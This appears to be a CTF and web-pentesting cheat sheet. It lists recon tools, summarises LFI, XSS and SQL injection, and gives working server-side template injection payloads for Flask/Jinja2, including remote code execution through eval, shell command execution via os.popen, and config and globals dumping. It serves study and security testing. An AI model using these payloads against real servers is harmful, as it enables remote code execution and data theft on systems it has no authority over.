##  Web directory bruteforcers
- dirb(run dirb on terminal)
- dirbuster (requires GUI)
- gobuster (similar tool)
- dirsearch(faster alternative to dirb) [GitHub](https://github.com/maurosoria/dirsearch)
##  Web crawlers
- dirhunt [GitHub](https://github.com/Nekmo/dirhunt)
##  Packet utils
- Burp Suite (requires GUI) [Website](https://portswigger.net/burp)
- wget
## LFI (Local File Inclusion)
- Commonly found in PHP web application (maybe through Wordpress plugins etc)
- Vulnerable websites can allow you to access local files through directory traversal
- Look out for ways where you can supply a file path and it is served as a download/printed to the page
## XSS
- Stored XSS
> Website uses external resources that contains malicious code</br>
> If an SVG with XSS payload is in an iframe or embed of a website, it can be executed
- Reflected XSS
> When queries to a website is handled and returned in an unsafe way
- DOM based XSS
> Client side attack, browser executes payload that didn't came from the server
## SQL Injection
- Union based attack
> Application displays the output of the query, allowing you to steal information from the database
- Error based attack
> Application returns an error with details about the query, helping you to craft queries to bypass checks
- Resources
> Sqlmap [GitHub](https://github.com/sqlmapproject/)</br>
> Practice [Website](http://mystery.knightlab.com/)
## Server-side Template Injection (SSTI)
### Testing:  

```
{{ 7*'7' }}
    Twig: 49
    Jinja2: 7777777
{{ 7 }}
    Golang: 7
```

### How to perform the SSTI:
For Flask servers:

Get config:
`{{config}}`

Python RCE:
```python
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__ == 'catch_warnings' %}
    {% for b in c.__init__.__globals__.values() %}
    {% if b.__class__ == {}.__class__ %}
      {% if 'eval' in b.keys() %}
        {{ b['eval']('<Python code here>') }}
      {% endif %}
    {% endif %}
    {% endfor %}
  {% endif %}
{% endfor %}
```

Execute shell statements:
```python
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__ == 'catch_warnings' %}
    {% for b in c.__init__.__globals__.values() %}
    {% if b.__class__ == {}.__class__ %}
      {% if 'eval' in b.keys() %}
        {{ b['eval']('__import__("os").popen("<SHELL STATEMENT HERE>").read()') }}
      {% endif %}
    {% endif %}
    {% endfor %}
  {% endif %}
{% endfor %}
```
Get all classes:
```python
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

Get local/global variables (from Python RCE)
```python
    {% for c in [].__class__.__base__.__subclasses__() %}
      {% if c.__name__ == 'catch_warnings' %}
        {% for b in c.__init__.__globals__.values() %}
        {% if b.__class__ == {}.__class__ %}
          {% if 'eval' in b.keys() %}
            {{ b['eval']('dict(globals(), **locals())') }}
          {% endif %}
        {% endif %}
        {% endfor %}
      {% endif %}
    {% endfor %}
```

For golang:
```
{{.<variable or function here>}}
```
Note that the dot is important.

- Reference/more info [GitHub](https://github.com/w181496/Web-CTF-Cheatsheet#ssti) / [Translated Version](https://github-com.translate.goog/w181496/Web-CTF-Cheatsheet?_x_tr_sl=zh-CN&_x_tr_tl=en&_x_tr_hl=en-US&_x_tr_pto=wapp#ssti)
- Payload for more languages [Website](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

## Identify Vulnerablilities
- Steps to test for CSRF [Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery)
- Steps to test for Broken Authentication [Guide](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication)
